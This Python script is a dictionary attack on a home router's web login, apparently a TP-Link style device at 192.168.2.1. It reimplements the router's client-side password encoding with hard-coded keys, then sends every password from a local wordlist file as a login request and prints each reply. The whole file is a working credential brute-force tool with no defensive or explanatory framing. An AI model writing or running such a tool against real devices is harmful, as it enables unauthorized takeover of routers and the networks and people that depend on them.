import json
import requests
def securityEncode(passwd):
    e = ''
    short_k = "RDpbLfCPsJZ7fiv"
    long_k = 'yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21Bri'\
        'UWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL4'\
        '8rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57'\
        'fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5Zl'\
        'OZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW'

    f = len(passwd) if len(passwd) > 15 else 15
    for s in range(f):
        if s >= 15:
            n = passwd[s]
        else:
            if s >= len(passwd):
                l = short_k[s]
                n = chr(187) 
            else:
                l = short_k[s]
                n = passwd[s]
        index = ord(l)^ord(n)
        index = index % 255
        e += long_k[index]
    return e


def post(url,passwd_param):
    header = {"Content-Type": "application/json"}  
    d = {"method": "do", "login": {"password": passwd_param}}
    r = requests.post(url, headers=header, data=json.dumps(d))
    return r.text

if __name__ == '__main__':
    with open('/home/mickey/Arp_test/passwd.txt') as f:
        for passwd in f.readlines():
            passwd_param = securityEncode(passwd)
            print(post('http://192.168.2.1', passwd_param))


    

  
